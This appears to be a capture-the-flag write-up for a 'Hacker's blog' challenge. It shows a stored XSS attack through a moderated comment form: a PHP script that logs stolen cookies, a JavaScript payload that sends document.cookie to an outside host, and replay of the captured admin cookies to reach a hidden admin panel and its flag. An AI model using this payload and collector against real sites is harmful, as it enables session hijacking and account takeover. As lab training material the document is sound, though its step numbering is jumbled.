# Hacker's blog

![Site](/img/1.png)

1. Go to a hacker's blog, see the articles. Go to any article and find comments.
2. Try to write something. See that there is pre-moderation (10 min) - then the admin looks at comments and deletes bad comments.
3. Try XSS attack. Write a simple code to accept cookies on your web server:
```php
<?php
$text = urldecode($_SERVER['QUERY_STRING']);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
{
	$ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
	$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
	$ip=$_SERVER['REMOTE_ADDR'];
}
$file=fopen("file.txt", "a");
fwrite ($file, $text.PHP_EOL);
fwrite ($file, $ip.PHP_EOL);
fclose($file);
?>
```
5. Write in the text field the JS to steal cookies:
```js
<script>var img=new Image();img.src="http://site.ru/xss.php?"+ encodeURI(document.cookie);</script>
```
4. Get cookies `password=e0377f6e85d987d81e96c0381c789360fe90547bdf9be3b5082a492b9c4184f7; login=admin`
5. Now you need somewhere to apply cookies. Are looking for it or admin authorization. On any page, you can find review: `Secret admin panel: aHR0cDovLzEwLjAuNy4yMTY6NTQzMzcvywrtaw42ndy0ms5waha=`. Decode base64 - http://10.0.7.216:54337/admin64641.php
6. We see the inscription: "Неверный логин или пароль! Доступ запрещен!". Use any extension to assign cookies. For Firefox https://addons.mozilla.org/ru/firefox/addon/cookies-manager-plus/developers
7. On the page `admin64641.php` see the flag.
